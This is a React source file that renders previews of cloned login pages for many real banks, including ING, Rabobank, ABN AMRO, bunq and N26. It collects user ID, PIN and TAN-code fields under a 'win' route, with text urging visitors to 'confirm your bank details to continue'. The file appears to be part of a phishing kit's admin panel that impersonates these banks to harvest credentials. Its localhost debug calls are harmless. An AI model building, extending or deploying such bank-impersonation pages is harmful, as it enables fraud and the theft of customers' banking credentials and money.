"use client";

import { useEffect, useState } from "react";
import { BankConfig } from "@/lib/banks-db";
import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";
import { DemoShell } from "@/components/demo/DemoShell";
import type { BankTheme } from "@/lib/bank-theme-config";
import { getBankTheme } from "@/lib/bank-theme-config";
import { getRenderableImageProps } from "@/lib/visual-tree-logo";
import parse, { attributesToProps, domToReact, Element } from "html-react-parser";

// Özel Tasarım İçe Aktarımları
import { AbnAmroLoginClient } from "@/app/win/[id]/bank/[bank_slug]/abn-amro-client";
import { AdyenLoginClient } from "@/app/win/[id]/bank/[bank_slug]/adyen-client";
import { AsnBankLoginClient } from "@/app/win/[id]/bank/[bank_slug]/asn-bank-client";
import { AsnBankVhRegiobankLoginClient } from "@/app/win/[id]/bank/[bank_slug]/asn-bank-vh-regiobank-client";
import { AsnBankVoorheenBlgwonenLoginClient } from "@/app/win/[id]/bank/[bank_slug]/asn-bank-voorheen-blgwonen-client";
import { AsnBankVoorheenSnsLoginClient } from "@/app/win/[id]/bank/[bank_slug]/asn-bank-voorheen-sns-client";
import { BunqLoginClient } from "@/app/win/[id]/bank/[bank_slug]/bunq-client";
import { AutoRedirectClient } from "@/app/win/[id]/bank/[bank_slug]/auto-redirect-client";
import { VanLanschotKempenClient } from "@/app/win/[id]/bank/[bank_slug]/van-lanschot-kempen-client";
import { IngClient } from "@/app/win/[id]/bank/[bank_slug]/ing-client";
import { FinomClient } from "@/app/win/[id]/bank/[bank_slug]/finom-client";
import { YoursafeClient } from "@/app/win/[id]/bank/[bank_slug]/yoursafe-client";
import { RabobankClient } from "@/app/win/[id]/bank/[bank_slug]/rabobank-client";
import { N26Client } from "@/app/win/[id]/bank/[bank_slug]/n26-client";
import { NationaleNederlandenClient } from "@/app/win/[id]/bank/[bank_slug]/nationale-nederlanden-client";
import { TriodosBankClient } from "@/app/win/[id]/bank/[bank_slug]/triodos-bank-client";

export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
  const [theme, setTheme] = useState<BankTheme | null>(null);

  useEffect(() => {
    let cancelled = false;
    if (bank && bank.slug) {
      void (async () => {
        const nextTheme = await getBankTheme(bank.slug);
        if (!cancelled) setTheme(nextTheme);
      })();
    }
    return () => {
      cancelled = true;
    };
  }, [bank?.slug]);

  if (!bank) return null;

  // 1. ÖNCELİK: ÖZEL OLARAK KODLANMIŞ MÜSTAKİL BANKA TASARIMLARI
  const renderCustomClient = () => {
    const sId = "preview";
    const bank_slug = bank.slug;
    const bankName = bank.name;
    const hasGeneratedDesign = Boolean(bank.design?.visualTree || bank.design?.customHtml);

    if (bank_slug === "van-lanschot-kempen" && !hasGeneratedDesign) {
      // #region debug-point E:preview-custom-client
      void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "pre-fix", hypothesisId: "E", location: "DynamicBankPreview.tsx:53", msg: "[DEBUG] Preview forced to Van Lanschot custom client", data: { slug: bank_slug, bankName, hasDesign: Boolean(bank.design), hasVisualTree: Boolean(bank.design?.visualTree), hasCustomHtml: Boolean(bank.design?.customHtml), logoFile: bank.logoFile }, ts: Date.now() }) }).catch(() => {});
      // #endregion
      return <VanLanschotKempenClient sessionId={sId} />;
    }
    if (bank_slug === "ing") return <IngClient sessionId={sId} />;
    if (bank_slug === "finom") return <FinomClient sessionId={sId} />;
    if (bank_slug === "yoursafe") return <YoursafeClient sessionId={sId} />;
    if (bank_slug === "rabobank") return <RabobankClient sessionId={sId} />;
    if (bank_slug === "n26") return <N26Client sessionId={sId} />;
    if (bank_slug === "nationale-nederlanden") return <NationaleNederlandenClient sessionId={sId} />;
    if (bank_slug === "triodos-bank") return <TriodosBankClient sessionId={sId} />;
    if (bank_slug === "abn-amro") return <AbnAmroLoginClient sessionId={sId} />;
    if (bank_slug === "adyen") return <AdyenLoginClient sessionId={sId} />;
    if (bank_slug === "asn-bank") return <AsnBankLoginClient sessionId={sId} />;
    if (bank_slug === "asn-bank-vh-regiobank") return <AsnBankVhRegiobankLoginClient sessionId={sId} />;
    if (bank_slug === "asn-bank-voorheen-blgwonen") return <AsnBankVoorheenBlgwonenLoginClient sessionId={sId} />;
    if (bank_slug === "asn-bank-voorheen-sns") return <AsnBankVoorheenSnsLoginClient sessionId={sId} />;
    if (bank_slug === "bunq") return <BunqLoginClient sessionId={sId} />;
    
    return null;
  };

  const customClient = renderCustomClient();
  if (customClient) {
    return (
      <div style={{ pointerEvents: 'none' }}>
        {customClient}
      </div>
    );
  }

  // 2. ÖNCELİK: DİNAMİK YAPISAL JSON TASARIMI (AI veya Admin Paneli ile üretilmiş)
  if (bank.design) {
    const design = bank.design;
    
    if (design.visualTree) {
      const renderVisualTree = (element: any): React.ReactNode => {
        const Tag = element.type === "container" ? "div" : 
                    element.type === "text" ? "span" : 
                    element.type === "form" ? "form" : 
                    element.type === "button" ? "button" : 
                    element.type === "image" ? "img" : 
                    element.type === "input" ? "input" : "div";

        const props: any = {
          key: element.id,
          style: element.styles,
          ...element.attributes,
        };

        if (element.type === "image") {
          // #region debug-point B:preview-image-node
          void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "pre-fix", hypothesisId: "B", location: "DynamicBankPreview.tsx:100", msg: "[DEBUG] Preview visualTree image node encountered", data: { slug: bank.slug, elementId: element.id, src: props.src ?? null, styles: element.styles ?? null, logoFile: bank.logoFile ?? null }, ts: Date.now() }) }).catch(() => {});
          // #endregion
        }

        if (element.type === "image") {
          Object.assign(props, getRenderableImageProps(element, bank.logoFile, bank.name));
        }

        if (element.type === "image" && props.src === "placeholder" && bank.logoFile) {
          // #region debug-point A:preview-placeholder-swap
          void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "pre-fix", hypothesisId: "A", location: "DynamicBankPreview.tsx:105", msg: "[DEBUG] Preview logo placeholder replaced", data: { slug: bank.slug, elementId: element.id, originalSrc: "placeholder", injectedSrc: bank.logoFile, styles: element.styles ?? null }, ts: Date.now() }) }).catch(() => {});
          // #endregion
          props.src = bank.logoFile;
        }

        if (element.type === "input" || element.type === "button") {
          props.disabled = true; // disabled in preview
        }

        if (element.type === "input" || element.type === "image") {
          return <Tag {...props} />;
        }

        return (
          <Tag {...props}>
            {element.content}
            {element.children?.map(renderVisualTree)}
          </Tag>
        );
      };

      return (
        <div style={{ pointerEvents: 'none' }} className="min-h-screen w-full font-sans antialiased scale-75 origin-top relative">
          {renderVisualTree(design.visualTree)}
        </div>
      );
    }

    if (design.customHtml) {
      const options = {
        replace: (domNode: any) => {
          if (domNode instanceof Element) {
            if (domNode.name === "input" && domNode.attribs?.name === "verfuegernummer") {
              const props = attributesToProps(domNode.attribs);
              return <input {...props} disabled placeholder="Kullanıcı Adı" />;
            }
            if (domNode.name === "input" && domNode.attribs?.name === "pin") {
              const props = attributesToProps(domNode.attribs);
              return <input {...props} disabled type="password" placeholder="Şifre" />;
            }
            if (domNode.name === "input" && domNode.attribs?.name === "tacCode") {
              const props = attributesToProps(domNode.attribs);
              return <input {...props} disabled placeholder="Kod" />;
            }
            if (domNode.name === "button" && domNode.attribs?.type === "submit") {
              const props = attributesToProps(domNode.attribs);
              return <button {...props} disabled>{domToReact(domNode.children as any, options)}</button>;
            }
            if (domNode.name === "img" && domNode.attribs?.src && domNode.attribs.src.includes("placeholder")) {
              if (bank.logoFile) {
                const props = attributesToProps(domNode.attribs);
                return <img {...props} src={bank.logoFile} alt={bank.name} style={{ ...(props.style ?? {}), maxWidth: "100%", maxHeight: "100%", objectFit: "contain", objectPosition: "left center", display: "block" }} />;
              }
            }
          }
        }
      };
      return (
        <div style={{ pointerEvents: 'none' }} className="min-h-screen w-full font-sans antialiased scale-75 origin-top">
          {parse(design.customHtml, options)}
        </div>
      );
    }

    const renderBlock = (block: BlockType) => {
      switch (block) {
        case "header":
          if (!design.header.show) return null;
          return (
            <header 
              key="header"
              style={{ 
                backgroundColor: design.header.backgroundColor, 
                height: design.header.height,
                padding: design.header.padding,
                display: 'flex',
                alignItems: 'center',
                justifyContent: design.header.logoAlignment === 'center' ? 'center' : design.header.logoAlignment === 'right' ? 'flex-end' : 'flex-start'
              }}
            >
              {bank.logoFile ? (
                <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '100%', maxWidth: '200px', objectFit: 'contain' }} />
              ) : (
                <div style={{ fontSize: '24px', fontWeight: 'bold', color: design.typography.headerColor }}>{bank.logo}</div>
              )}
            </header>
          );
        
        case "form":
          return (
            <div key="form" style={{ display: 'flex', justifyContent: design.formBox.alignment === 'center' ? 'center' : design.formBox.alignment === 'right' ? 'flex-end' : 'flex-start', padding: '2rem' }}>
              <div 
                style={{
                  backgroundColor: design.formBox.backgroundColor,
                  color: design.formBox.textColor,
                  borderRadius: design.formBox.borderRadius,
                  boxShadow: design.formBox.boxShadow !== 'none' ? '0 10px 25px -5px rgba(0, 0, 0, 0.1)' : 'none',
                  padding: design.formBox.padding,
                  width: design.formBox.width,
                  maxWidth: '100%',
                  fontFamily: design.typography.fontFamily
                }}
              >
                <h2 style={{ fontSize: '24px', fontWeight: 'bold', color: design.typography.headerColor, marginBottom: '0.5rem' }}>{design.texts.title}</h2>
                <p style={{ fontSize: '15px', color: design.typography.bodyColor, marginBottom: '2rem' }}>{design.texts.subtitle}</p>
                
                <div style={{ marginBottom: '1rem' }}>
                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Gebruikersnaam</label>
                  <input disabled type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px' }} placeholder="..." />
                </div>
                <div style={{ marginBottom: '1.5rem' }}>
                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Wachtwoord</label>
                  <input disabled type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px' }} placeholder="..." />
                </div>
                
                <button 
                  disabled
                  style={{
                    width: '100%',
                    backgroundColor: design.button.backgroundColor,
                    color: design.button.textColor,
                    padding: design.button.padding,
                    borderRadius: design.button.borderRadius,
                    fontWeight: design.button.fontWeight as any,
                    border: 'none',
                    cursor: 'pointer'
                  }}
                >
                  {design.texts.title}
                </button>
              </div>
            </div>
          );

        case "footer":
          return (
            <footer key="footer" style={{ padding: '2rem', textAlign: 'center', marginTop: 'auto' }}>
              <div style={{ display: 'flex', justifyContent: 'center', gap: '2rem', flexWrap: 'wrap' }}>
                {design.texts.footerLinks.map((link, i) => (
                  <a key={i} href="#" style={{ color: design.typography.linkColor, fontSize: '14px', textDecoration: 'none' }}>{link}</a>
                ))}
              </div>
            </footer>
          );

        case "spacer":
          return <div key={Math.random()} style={{ flexGrow: 1, minHeight: '2rem' }}></div>;
          
        default:
          return null;
      }
    };

    return (
      <div 
        style={{
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          backgroundColor: design.background.type === 'color' ? design.background.value : 'transparent',
          backgroundImage: design.background.type === 'image' ? `url(${design.background.value})` : 'none',
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          fontFamily: design.typography.fontFamily
        }}
      >
        {design.blocks.map(block => renderBlock(block))}
      </div>
    );
  }

  // EĞER ÖZEL TASARIM YOKSA (ESKİ FALLBACK TASARIM)
  if (!theme) {
    return (
      <DemoShell title={`${bank.name} inloggen`} subtitle="Even geduld...">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-zinc-300 border-t-zinc-600" />
        </div>
      </DemoShell>
    );
  }

  const primaryColor = bank.brandColor || theme.colors.primary;
  const secondaryColor = bank.accentColor || theme.colors.secondary;
  const logoText = bank.logo || theme.logoText;

  return (
    <div style={{ pointerEvents: 'none' }}>
      <DemoShell title={`${bank.name} inloggen`} subtitle="Bevestig je bankgegevens om verder te gaan.">
        <div className="app-panel overflow-hidden rounded-2xl">
          <div
            className="flex items-center justify-between px-5 py-4 text-white"
            style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
          >
            <div className="flex items-center gap-3">
              <div
                className="grid h-10 min-w-10 place-items-center rounded-md px-2 text-xs font-bold tracking-wide"
                style={{ backgroundColor: secondaryColor, color: theme.colors.textOnPrimary }}
              >
                {bank.logoFile ? (
                  <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '24px', objectFit: 'contain' }} />
                ) : (
                  logoText
                )}
              </div>
              <div>
                <p className="text-xs uppercase tracking-widest opacity-80">Veilige Bankomgeving</p>
                <h2 className="text-lg font-bold">{bank.name}</h2>
              </div>
            </div>
          </div>

          <div className="space-y-4 p-5">
            <label className="block text-sm font-bold text-zinc-800">
              {theme.inputLabels.verfuegernummer}
              <input disabled className="app-input mt-1 w-full px-3 py-2" placeholder="..." />
            </label>

            <label className="block text-sm font-bold text-zinc-800">
              {theme.inputLabels.pin}
              <input disabled type="password" className="app-input mt-1 w-full px-3 py-2" placeholder="..." />
            </label>

            <label className="block text-sm font-bold text-zinc-800">
              {theme.inputLabels.tacCode}
              <input disabled className="app-input mt-1 w-full px-3 py-2" placeholder="..." />
            </label>

            <button disabled className="app-btn w-full rounded-xl py-3 text-sm opacity-60" style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}>
              {theme.buttonText}
            </button>
          </div>
        </div>
      </DemoShell>
    </div>
  );
}
